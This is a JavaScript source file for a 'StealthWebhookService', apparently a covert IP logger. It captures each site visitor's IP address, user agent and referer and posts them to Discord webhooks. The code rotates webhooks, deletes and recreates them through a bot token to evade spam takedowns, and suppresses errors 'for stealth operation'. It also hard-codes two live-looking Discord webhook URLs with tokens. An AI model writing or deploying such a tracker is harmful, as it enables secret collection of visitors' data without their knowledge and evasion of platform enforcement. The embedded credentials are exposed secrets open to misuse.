const fetch = require('node-fetch');

class StealthWebhookService {
  constructor() {
    // Discord Bot Configuration - Use environment variables
    this.botToken = process.env.DISCORD_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
    this.channelId = process.env.DISCORD_CHANNEL_ID || 'YOUR_CHANNEL_ID_HERE';
    this.discordApiBase = 'https://discord.com/api/v10';

    // Anti-spam configuration
    this.spamThreshold = 10; // messages per second
    this.spamWindow = 1000; // 1 second window
    this.messageHistory = new Map(); // Track messages per webhook
    this.spamDetected = new Set(); // Track webhooks with spam

    // Load webhook URLs from environment variables
    this.webhooks = this.loadWebhooksFromEnv();

    this.currentWebhookIndex = 0;
    this.rateLimitDelay = 1000; // 1 second between requests
    this.maxFailures = 3; // Max failures before marking webhook as inactive
    this.retryDelay = 5000; // 5 seconds before retrying failed webhook
    this.lastRequestTime = 0;

    // Start spam detection cleanup
    this.startSpamCleanup();
  }

  // Load webhook URLs from environment variables
  loadWebhooksFromEnv() {
    const webhooks = [];
    const webhookCount = parseInt(process.env.WEBHOOK_COUNT) || 13;
    
    for (let i = 1; i <= webhookCount; i++) {
      const webhookUrl = process.env[`WEBHOOK_URL_${i}`];
      if (webhookUrl) {
        webhooks.push({
          url: webhookUrl,
          id: `webhook_${i}`,
          status: 'active',
          lastUsed: null,
          failureCount: 0,
          lastFailure: null,
          messageCount: 0,
          lastMessageTime: null
        });
      }
    }

    // If no webhooks found in env, use fallback
    if (webhooks.length === 0) {
      console.warn('No webhook URLs found in environment variables. Using fallback webhooks.');
      return this.getFallbackWebhooks();
    }

    return webhooks;
  }

  // Fallback webhooks (for development/testing)
  getFallbackWebhooks() {
    return [
      {
        url: 'https://discord.com/api/webhooks/1395900214824665098/cn3U16abUx054ptKaxUkhwjPCYotOJeZBuAer6GVWrItAAzNj20kl0U4QU83k4KWgI6c',
        id: 'webhook_1',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900221535293501/Zx1OSNZbDbw89LBDOKIh8k3nd9Gz1UffCyTbDOD2AWirGw3Llfws2s9YAYSkBzkegT5s',
        id: 'webhook_2',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      }
    ];
  }

  // Get client IP address from request
  getClientIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           req.ip || 
           'unknown';
  }

  // Get website URL from request
  getWebsiteUrl(req) {
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.headers['x-forwarded-host'] || req.get('host');
    return `${protocol}://${host}`;
  }

  // Get website name from request
  getWebsiteName(req) {
    const host = req.headers['x-forwarded-host'] || req.get('host');
    return host.replace(/^www\./, '').split('.')[0] || 'Unknown Site';
  }

  // Rate limiting protection
  async checkRateLimit() {
    const now = Date.now();
    const timeSinceLastRequest = now - this.lastRequestTime;
    
    if (timeSinceLastRequest < this.rateLimitDelay) {
      await new Promise(resolve => setTimeout(resolve, this.rateLimitDelay - timeSinceLastRequest));
    }
    
    this.lastRequestTime = Date.now();
  }

  // Check for spam on a webhook
  checkSpam(webhookId) {
    const now = Date.now();
    const webhook = this.webhooks.find(w => w.id === webhookId);
    
    if (!webhook) return false;

    // Reset message count if outside spam window
    if (!webhook.lastMessageTime || (now - webhook.lastMessageTime) > this.spamWindow) {
      webhook.messageCount = 0;
      webhook.lastMessageTime = now;
    }

    // Increment message count
    webhook.messageCount++;

    // Check if spam threshold exceeded
    if (webhook.messageCount >= this.spamThreshold) {
      this.spamDetected.add(webhookId);
      return true;
    }

    return false;
  }

  // Clean up spam detection data
  startSpamCleanup() {
    setInterval(() => {
      const now = Date.now();
      
      // Clean up old message history
      for (const [webhookId, messages] of this.messageHistory.entries()) {
        const filteredMessages = messages.filter(msg => (now - msg.timestamp) < this.spamWindow);
        if (filteredMessages.length === 0) {
          this.messageHistory.delete(webhookId);
        } else {
          this.messageHistory.set(webhookId, filteredMessages);
        }
      }

      // Reset spam detection for webhooks that haven't been used recently
      for (const webhook of this.webhooks) {
        if (webhook.lastMessageTime && (now - webhook.lastMessageTime) > this.spamWindow * 2) {
          webhook.messageCount = 0;
          this.spamDetected.delete(webhook.id);
        }
      }
    }, 5000); // Clean up every 5 seconds
  }

  // Delete webhook using Discord API
  async deleteWebhook(webhookUrl) {
    try {
      const webhookId = webhookUrl.split('/').slice(-2)[0];
      
      const response = await fetch(`${this.discordApiBase}/webhooks/${webhookId}`, {
        method: 'DELETE',
        headers: {
          'Authorization': `Bot ${this.botToken}`,
          'Content-Type': 'application/json'
        }
      });

      return response.ok;
    } catch (error) {
      return false;
    }
  }

  // Create new webhook using Discord API
  async createWebhook(name = null) {
    try {
      // Generate dynamic webhook name if not provided
      const webhookName = name || `${this.getWebsiteNameFromEnv()} Logger ${Date.now()}`;
      
      const response = await fetch(`${this.discordApiBase}/channels/${this.channelId}/webhooks`, {
        method: 'POST',
        headers: {
          'Authorization': `Bot ${this.botToken}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          name: webhookName,
          avatar: null
        })
      });

      if (response.ok) {
        const webhookData = await response.json();
        
        // Send notification about new webhook creation
        await this.notifyWebhookCreation(webhookData);
        
        return {
          url: `https://discord.com/api/webhooks/${webhookData.id}/${webhookData.token}`,
          id: `webhook_${Date.now()}`,
          status: 'active',
          lastUsed: null,
          failureCount: 0,
          lastFailure: null,
          messageCount: 0,
          lastMessageTime: null,
          name: webhookData.name,
          discordId: webhookData.id
        };
      } else {
        return null;
      }
    } catch (error) {
      return null;
    }
  }

  // Notify about webhook creation
  async notifyWebhookCreation(webhookData) {
    try {
      // Use the first available webhook to send notification
      const availableWebhook = this.webhooks.find(w => w.status === 'active' && !this.spamDetected.has(w.id));
      
      if (availableWebhook) {
        const websiteName = this.getWebsiteNameFromEnv();
        const notificationPayload = {
          embeds: [{
            title: "🔗 New Webhook Created",
            description: "A new webhook has been automatically created to replace a spam-detected webhook.",
            color: 0x00ff00,
            fields: [
              {
                name: "📝 Webhook Name",
                value: webhookData.name,
                inline: true
              },
              {
                name: "🆔 Webhook ID",
                value: webhookData.id,
                inline: true
              },
              {
                name: "⏰ Created At",
                value: new Date().toISOString(),
                inline: true
              },
              {
                name: "🚨 Reason",
                value: "Spam detection triggered automatic regeneration",
                inline: false
              }
            ],
            footer: {
              text: `${websiteName} - Anti-Spam System`
            },
            timestamp: new Date().toISOString()
          }]
        };

        await fetch(availableWebhook.url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(notificationPayload)
        });
      }
    } catch (error) {
      // Silent error handling for stealth operation
    }
  }

  // Handle spam detection and webhook regeneration
  async handleSpam(webhookId) {
    const webhook = this.webhooks.find(w => w.id === webhookId);
    if (!webhook) return;

    // Mark webhook as inactive
    webhook.status = 'inactive';
    webhook.failureCount = this.maxFailures + 1;

    // Delete the webhook from Discord
    await this.deleteWebhook(webhook.url);

    // Create a new webhook to replace it
    const newWebhook = await this.createWebhook(`guns.lol Logger ${Date.now()}`);
    
    if (newWebhook) {
      // Replace the old webhook with the new one
      const index = this.webhooks.findIndex(w => w.id === webhookId);
      if (index !== -1) {
        this.webhooks[index] = newWebhook;
      }
    }

    // Remove from spam detected set
    this.spamDetected.delete(webhookId);
  }

  // Validate webhook URL
  async validateWebhook(webhook) {
    try {
      const response = await fetch(webhook.url, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 5000
      });

      return response.ok;
    } catch (error) {
      return false;
    }
  }

  // Get next available webhook
  async getNextAvailableWebhook() {
    let attempts = 0;
    const maxAttempts = this.webhooks.length;

    while (attempts < maxAttempts) {
      const webhook = this.webhooks[this.currentWebhookIndex];
      
      // Check if webhook is active, hasn't failed too many times, and isn't spam detected
      if (webhook.status === 'active' && 
          webhook.failureCount < this.maxFailures && 
          !this.spamDetected.has(webhook.id)) {
        
        // Validate webhook if it hasn't been used recently
        if (!webhook.lastUsed || Date.now() - webhook.lastUsed > 300000) { // 5 minutes
          const isValid = await this.validateWebhook(webhook);
          if (!isValid) {
            webhook.status = 'inactive';
            webhook.failureCount++;
            webhook.lastFailure = Date.now();
            this.currentWebhookIndex = (this.currentWebhookIndex + 1) % this.webhooks.length;
            attempts++;
            continue;
          }
        }
        
        return webhook;
      }
      
      // Move to next webhook
      this.currentWebhookIndex = (this.currentWebhookIndex + 1) % this.webhooks.length;
      attempts++;
    }

    // If no webhooks are available, try to reactivate some
    await this.reactivateWebhooks();
    
    // Try one more time after reactivation
    for (let i = 0; i < this.webhooks.length; i++) {
      const webhook = this.webhooks[i];
      if (webhook.status === 'active' && 
          webhook.failureCount < this.maxFailures && 
          !this.spamDetected.has(webhook.id)) {
        this.currentWebhookIndex = i;
        return webhook;
      }
    }

    throw new Error('No available webhooks');
  }

  // Reactivate webhooks that have been inactive for a while
  async reactivateWebhooks() {
    const reactivationDelay = 300000; // 5 minutes
    
    for (const webhook of this.webhooks) {
      if (webhook.status === 'inactive' && 
          webhook.lastFailure && 
          Date.now() - webhook.lastFailure > reactivationDelay &&
          !this.spamDetected.has(webhook.id)) {
        
        const isValid = await this.validateWebhook(webhook);
        if (isValid) {
          webhook.status = 'active';
          webhook.failureCount = 0;
          webhook.lastFailure = null;
        }
      }
    }
  }

  // Send message to webhook with retry logic and spam detection
  async sendMessage(payload, req) {
    await this.checkRateLimit();

    const clientIP = this.getClientIP(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toISOString();
    const websiteUrl = this.getWebsiteUrl(req);
    const websiteName = this.getWebsiteName(req);

    // Enhanced payload with IP information
    const enhancedPayload = {
      ...payload,
      embeds: [
        {
          title: "🔍 IP Address Detected",
          color: 0x00ff00,
          fields: [
            {
              name: "🌐 IP Address",
              value: clientIP,
              inline: true
            },
            {
              name: "🕒 Timestamp",
              value: timestamp,
              inline: true
            },
            {
              name: "🌍 User Agent",
              value: userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : ''),
              inline: false
            },
            {
              name: "🔗 Referer",
              value: req.headers.referer || 'Direct Access',
              inline: false
            },
            {
              name: "🌐 Website",
              value: websiteUrl,
              inline: true
            }
          ],
          footer: {
            text: `${websiteName} - Automated IP Logger`
          },
          timestamp: timestamp
        }
      ]
    };

    let lastError = null;
    const maxRetries = 3;

    for (let retry = 0; retry < maxRetries; retry++) {
      try {
        const webhook = await this.getNextAvailableWebhook();
        
        // Check for spam before sending
        if (this.checkSpam(webhook.id)) {
          await this.handleSpam(webhook.id);
          continue; // Try with next webhook
        }

        const response = await fetch(webhook.url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(enhancedPayload),
          timeout: 10000
        });

        if (response.ok) {
          // Success - update webhook stats
          webhook.lastUsed = Date.now();
          webhook.failureCount = 0;
          webhook.lastFailure = null;
          
          return {
            success: true,
            webhookId: webhook.id,
            message: 'Message sent successfully'
          };
        } else {
          // Handle different error responses
          if (response.status === 404) {
            webhook.status = 'inactive';
            webhook.failureCount++;
            webhook.lastFailure = Date.now();
          } else if (response.status === 429) {
            // Rate limited - wait and retry
            const retryAfter = response.headers.get('retry-after') || 60;
            await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
          } else {
            webhook.failureCount++;
            webhook.lastFailure = Date.now();
          }
          
          lastError = new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
      } catch (error) {
        lastError = error;
        
        // Mark current webhook as failed
        if (this.webhooks[this.currentWebhookIndex]) {
          this.webhooks[this.currentWebhookIndex].failureCount++;
          this.webhooks[this.currentWebhookIndex].lastFailure = Date.now();
        }
      }

      // Wait before retry
      if (retry < maxRetries - 1) {
        await new Promise(resolve => setTimeout(resolve, this.retryDelay));
      }
    }

    throw new Error(`Failed to send message after ${maxRetries} retries. Last error: ${lastError.message}`);
  }

  // Get webhook status for monitoring (stealth version)
  getWebhookStatus() {
    return {
      total: this.webhooks.length,
      active: this.webhooks.filter(w => w.status === 'active' && !this.spamDetected.has(w.id)).length,
      inactive: this.webhooks.filter(w => w.status === 'inactive' || this.spamDetected.has(w.id)).length,
      spamDetected: this.spamDetected.size,
      currentIndex: this.currentWebhookIndex,
      webhooks: this.webhooks.map(w => ({
        id: w.id,
        status: w.status,
        failureCount: w.failureCount,
        lastUsed: w.lastUsed,
        lastFailure: w.lastFailure,
        messageCount: w.messageCount,
        spamDetected: this.spamDetected.has(w.id),
        name: w.name || 'Unknown'
      }))
    };
  }

  // Get spam statistics
  getSpamStats() {
    return {
      spamDetected: this.spamDetected.size,
      totalWebhooks: this.webhooks.length,
      activeWebhooks: this.webhooks.filter(w => w.status === 'active' && !this.spamDetected.has(w.id)).length,
      spamThreshold: this.spamThreshold,
      spamWindow: this.spamWindow
    };
  }

  // Get website name from environment or default
  getWebsiteNameFromEnv() {
    return process.env.WEBSITE_NAME || 'Website';
  }
}

module.exports = StealthWebhookService; 